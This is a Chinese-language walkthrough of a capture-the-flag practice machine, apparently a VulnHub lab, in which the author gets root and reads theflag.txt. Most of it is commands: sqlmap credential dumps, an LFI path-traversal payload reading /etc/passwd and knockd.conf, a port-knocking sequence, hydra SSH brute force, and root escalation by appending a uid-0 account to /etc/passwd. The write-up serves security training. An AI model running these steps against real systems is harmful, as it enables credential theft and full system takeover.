靶机目标

提权到 root 读取 theflag.txt

工具

arp-scan、nmap、burpsuite、sqlmap、ssh、hydra

操作过程

一、信息收集

打开靶机后先用攻击机扫描靶机的 IP 地址

1arp-scan 192.168.189.0/24

扫描到靶机 IP ：192.168.189.133，扫描一下开放端口

1nmap -sV -A -p 1-65535 192.168.189.133

扫描出两个端口，一个是“filtered”状态的22端口和开放状态的80端口。

二、SQL注入

浏览器访问

在 search.php 发现输入框，且与数据库有交互，burp 抓包查看一下

猜测在 search= 处存在注入点，将数据包复制保存为 1.txt 丢 sqlmap 跑起来

sqlmap -r 1.txt --dbs

sqlmap -r 1.txt -D users --tables

sqlmap -r 1.txt -D users -T UserDetails --columns

sqlmap -r 1.txt -D users -T UserDetails -C username,password --dump爆出几组用户名密码，先保存一下

继续注入另一个数据库

sqlmap -r 1.txt -D Staff --tables

sqlmap -r 1.txt -D Staff -T Users --columns

sqlmap -r 1.txt -D Staff -T Users -C username,password --dump

爆出一组管理员用户名密码

md5解密一下

得到管理员用户名密码：admin / transorbital1 。在浏览器的 manage.php 页面登录

网页提示：File does not exist ，猜测存在 LFI ，测试读取 /etc/passwd 成功

192.168.189.133/welcome.php?file=../../../../etc/passwd

但是 LFI 不能直接 getshell 。转换一下思路，刚刚 nmap 扫描端口时 ssh 处于“filtered”状态，猜测是被 knockd 服务隐藏了。

端口敲门服务，即：knockd服务。该服务通过动态的添加iptables规则来隐藏系统开启的服务，使用自定义的一系列序列号来“敲门”，使系统开启需要访问的服务端口，才能对外访问。不使用时，再使用自定义的序列号来“关门”，将端口关闭，不对外监听。进一步提升了服务和系统的安全性。

尝试读取 /etc/knockd.conf 文件

192.168.189.133/welcome.php?file=../../../../etc/knockd.conf

文件提示需要依次敲击 7469 , 8475 , 9842 三个端口

nmap -p 7469 192.168.189.133
nmap -p 8475 192.168.189.133
nmap -p 9842 192.168.189.133
nmap -p 22 192.168.189.133

可以看到 ssh 服务已经开启了，将之前 注入出的用户名密码分别保存到 user.txt 和 passwd.txt 中，使用 hydra 爆破

hydra -L user.txt -P passwd.txt  192.168.189.133 ssh

爆破出三组用户名密码，逐个登录 ssh ，ls -al 以及 sudo -l ，最终 janitor 用户下找到了另一组密码

将这些密码添加到 passwd.txt 中再次使用 hydra 爆破

hydra -L user.txt -P passwd.txt  192.168.189.133 ssh

又爆出一组用户名密码 fredf / B4-Tru3-001，登录 ssh ，查找可利用文件或程序

查看一下代码

find / -name "test.py" 2>/dev/null

脚本很简单，运行脚本时，第一个参数为要读取内容，第二个参数将读取的内容写到指定文件。

思路如下，我们知道，linux 指定用户是否为 root ，我们可以通过修改 /etc/passwd/ 文件来实现，所以，我们构造一个 root 权限的用户文件，写入到 /etc/passwd 文件中，即可成功拿下！

openssl passwd -1 -salt mubai qwe
echo "mubai:$1$mubai$ux7glHUEYl9FkQTfxKS2H0:0:0:root:/root:/bin/bash">1.txt
sudo ./test /tmp/1.txt /etc/passwd
su mubai

提权成功，拿到 theflag.txt
